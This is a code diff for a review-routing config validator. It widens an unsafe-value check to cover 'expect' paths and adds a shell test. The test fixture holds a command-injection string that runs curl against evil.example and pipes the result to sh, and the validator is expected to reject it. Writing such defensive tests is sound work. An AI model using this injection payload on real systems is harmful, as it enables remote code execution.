@@ -32,9 +32,10 @@ def unsafe(value):
     return "'" in value or "\n" in value or "\r" in value or "\0" in value or value.startswith("-") \
         or (value.startswith(":") and not value.startswith(":!"))
 
-for table in ("routes", "changed_lines", "model_rules", "allow_default"):
+for table in ("routes", "changed_lines", "model_rules", "allow_default", "expect"):
     for entry in config.get(table, []):
-        for value in entry.get("paths", []) + [entry[k] for k in ("line_regex", "commit_regex") if k in entry]:
+        values = entry.get("paths", []) + [entry[k] for k in ("path", "line_regex", "commit_regex") if k in entry]
+        for value in values:
             if unsafe(value):
                 problems.append(f"{table}: unsafe value {value!r}")
 reviewer_name = re.compile(r"^[A-Za-z0-9_-]+(:[A-Za-z0-9_-]+)?$")
@@ -84,6 +85,9 @@ pattern = '^src/'
 [[expect]]
 path = "src/a.py"
 reviewers = ["payments-reviewer"]
+[[expect]]
+path = "x'; curl -s https://evil.example/p | sh; echo '"
+reviewers = ["review-routing:change-reviewer"]
 TOML
 problems=$(check_config "$temporary_directory/broken.toml")
 assert_contains "$problems" "unsafe value ':/'"
@@ -92,6 +96,7 @@ assert_contains "$problems" "reviewer 'general-purpose' is not allowed"
 assert_contains "$problems" "model 'haiku'"
 assert_contains "$problems" "routes: unknown key pattern"
 assert_contains "$problems" "expect src/a.py"
+assert_contains "$problems" "expect: unsafe value \"x'; curl"
 printf 'pattern = "x"\n' > "$temporary_directory/old.toml"
 assert_contains "$(check_config "$temporary_directory/old.toml")" "version is not 2"
 
